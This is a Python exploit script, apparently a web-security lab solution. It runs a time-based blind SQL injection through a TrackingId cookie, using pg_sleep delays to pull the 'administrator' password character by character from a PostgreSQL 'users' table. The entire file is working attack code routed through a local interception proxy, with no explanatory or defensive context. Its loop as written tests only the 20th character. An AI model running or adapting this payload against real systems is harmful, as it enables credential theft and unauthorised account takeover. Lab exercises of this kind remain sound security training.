import requests
import sys
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def admin_password(url):
    extracted_pass = ""
    for i in range(20, 21):
        for j in range(32, 126):
            sqli_payload = "' || (SELECT CASE WHEN (username = 'administrator' AND ascii(SUBSTRING(password, %s, 1)) = '%s') THEN pg_sleep(10) ELSE pg_sleep(-1) END FROM users)--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            cookies = {'TrackingId': 'aSVDnc6AI5t8I8Vy' + sqli_payload_encoded, 'session': '3U7yarstDozoFgmZl1yc3h0yqyIF5I2G'}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            if int(r.elapsed.total_seconds()) >= 10:
                extracted_pass += chr(j)
                sys.stdout.write('\r' + extracted_pass)
                sys.stdout.flush()
                break
            else:
                sys.stdout.write('\r' + extracted_pass + chr(j))
                sys.stdout.flush()
 

def main():
    if len(sys.argv) != 2:
        print('[-] Usage: %s <url>' % sys.argv[0])
        print('[-] Example: %s www.example.com' % sys.argv[0])
        sys.exit(-1)
    
    url = sys.argv[1].strip()
    print('[+] Retrieving the administrator password....')
    admin_password(url)


if __name__ == '__main__':
    main()

